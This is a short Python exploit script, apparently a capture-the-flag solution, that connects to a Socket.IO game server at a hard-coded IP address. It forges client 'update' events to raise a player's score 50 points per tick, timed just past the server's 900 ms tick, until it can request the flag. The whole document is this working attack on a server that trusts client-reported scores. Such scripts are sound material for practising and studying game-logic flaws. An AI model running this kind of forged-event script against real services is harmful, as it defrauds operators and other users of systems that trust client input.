import websocket
import time

# Function to send an update event
def send_update(ws, score):
    payload = f'42["update",{{"name":"effie","score":{score}}}]'
    ws.send(payload)

# Main function
def main():
    ws = websocket.WebSocket()
    ws.connect("ws://103.127.138.252:35769/socket.io/?EIO=4&transport=websocket")
    
    # Step 1: Initialize the connection
    init_payload = '42["init",{"uuid":"e943b96d-4dfb-4f5e-b456-2f9b76045843","name":"effie"}]'
    ws.send(init_payload)
    print("Initialized connection")

    # Step 2: Increment score gradually
    current_score = 0
    increment = 50  # Max allowed per tick
    target_score = 5000

    while current_score < target_score:
        try:
            send_update(ws, increment)
        except (websocket.WebSocketConnectionClosedException, BrokenPipeError):
            print("Connection closed. Reconnecting...")
            ws = websocket.WebSocket()
            ws.connect("ws://103.127.138.252:35769/socket.io/?EIO=4&transport=websocket")
            # ws.send(init_payload)
        current_score += increment
        print(f"Sent update: +{increment} => {current_score}")
        time.sleep(1.1)  # Wait for > SERVER_TICK (900 ms)

    # Step 3: Request the flag
    ws.send('42["flag"]')
    print("Flag requested")
    
    while True:
        response = ws.recv()
        print("Response:", response)

if __name__ == "__main__":
    main()

